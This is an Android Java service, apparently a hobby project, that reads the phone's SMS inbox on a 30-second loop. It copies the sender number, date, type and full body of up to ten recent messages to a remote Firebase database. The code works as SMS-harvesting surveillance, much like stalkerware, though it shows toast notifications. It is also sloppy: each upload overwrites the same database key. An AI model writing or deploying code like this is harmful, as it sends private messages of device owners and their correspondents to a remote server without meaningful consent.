package com.example.servicesms;

import android.Manifest;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;

import android.os.Looper;
import android.os.Message;
import android.provider.CallLog;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.util.Date;

public class MyService extends Service {

    public static int aa=1;
    public int aaa=1;


    public MessageLogs m=new MessageLogs();
    DatabaseReference reff;
    long maxID=0;

    MediaPlayer myPlayer;


    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    @Override
    public void onCreate() {
        Toast.makeText(this, "Service Created", Toast.LENGTH_LONG).show();

        reff= FirebaseDatabase.getInstance().getReference().child("m");

        reff.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if(dataSnapshot.exists()){
                    maxID=(dataSnapshot.getChildrenCount());

                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {

            }
        });



        //  myPlayer = MediaPlayer.create(this, R.raw.song);
        //  myPlayer.setLooping(false); // Set looping
    }



    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {


        check();
        // If we get killed, after returning from here, restart
        return START_NOT_STICKY;
    }

    public void check()
    {
        final Handler handler = new Handler();
        Runnable runnable;


        final int delay=30
                *1000;
        handler.postDelayed( runnable = new Runnable() {
            public void run() {
                //do something
                Toast.makeText(getApplicationContext(), "Again and Agian", Toast.LENGTH_LONG).show();
                getCallDetails();

                check();

            }
        }, delay);


    }

    private void getCallDetails() {

      MessageLogs mm;



        if (ActivityCompat.checkSelfPermission(this,
                Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            // Log.d(TAG, "getLocation: stopping the location service.");
            stopSelf();
            Toast.makeText(getApplicationContext(),"ok",Toast.LENGTH_SHORT).show();
            return;
        }


        StringBuffer stringBuffer = new StringBuffer();
        stringBuffer.append("*********SMS History***************:");
        Uri uri = Uri.parse("content://sms");


        String strOrder= "date DESC";
        MessageLogs mem;
        int s=0;
        //ArrayList<CallLogs> arr=new ArrayList<>();



        Cursor cursor = getContentResolver().query(uri, null, null, null, strOrder);

        if (cursor.moveToFirst()) {
            for (int i = 0; i < cursor.getCount(); i++) {
                String body = cursor.getString(cursor.getColumnIndexOrThrow("body"))
                        .toString();
                String number = cursor.getString(cursor.getColumnIndexOrThrow("address"))
                        .toString();
                String date = cursor.getString(cursor.getColumnIndexOrThrow("date"))
                        .toString();
                java.util.Date smsDayTime = new Date(Long.valueOf(date));
                String type = cursor.getString(cursor.getColumnIndexOrThrow("type"))
                        .toString();
                String typeOfSMS = null;
                switch (Integer.parseInt(type)) {
                    case 1:
                        typeOfSMS = "INBOX";
                        break;

                    case 2:
                        typeOfSMS = "SENT";
                        break;

                    case 3:
                        typeOfSMS = "DRAFT";
                        break;



                }


                stringBuffer.append("\nPhone Number:--- " + number + " \nMessage Type:--- "
                        + typeOfSMS + " \nMessage Date:--- " + smsDayTime
                        + " \nMessage Body:--- " + body);


                //inserting data to Data Base
                m.body=body;
                m.date=smsDayTime.toString();
                m.PhoneNumber=number;
                m.Type=typeOfSMS;
                reff.child(String.valueOf(maxID+1)).setValue(m);
                //////////////////////



                aa=aa+1;
                stringBuffer.append("\n----------------------------------");
                cursor.moveToNext();
                if (aaa >= 10) {
                    break;
                }
                aaa++;


            }

        }
        aa=1;
        Toast.makeText(this,stringBuffer,Toast.LENGTH_LONG).show();

    }

    @Override
    public void onStart(Intent intent, int startid) {
        Toast.makeText(this, "Service Started", Toast.LENGTH_LONG).show();
        // myPlayer.start();
    }
    @Override
    public void onDestroy() {
        Toast.makeText(this, "Service Stopped", Toast.LENGTH_LONG).show();
        // myPlayer.stop();


    }
}